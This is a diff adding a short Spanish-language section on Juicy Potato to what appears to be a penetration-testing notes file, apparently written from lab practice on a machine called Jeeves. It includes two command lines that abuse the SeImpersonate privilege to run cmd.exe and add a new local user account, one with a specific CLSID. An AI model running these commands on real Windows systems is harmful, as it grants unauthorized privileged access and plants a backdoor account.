@@ -1614,10 +1614,20 @@ WES-NG is a tool based on the output of Windows' systeminfo utility which provid
 Tiene la capacidad de con el output del systeminfo genera las vulns pero da muchos falsos positivos.
 
 
+## Juicy Potato
+
+Esta es una herramienta donde puedes escalar privilegios si esta el SetImpersonate privilege activado. En la maquina Jeeves me funciono sin el CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) sin embargo, en las otras si tuve que ponerlo.
+
+```
+
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add"
 
 
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
 
+```
 
+> https://github.com/ohpe/juicy-potato
 
 
 
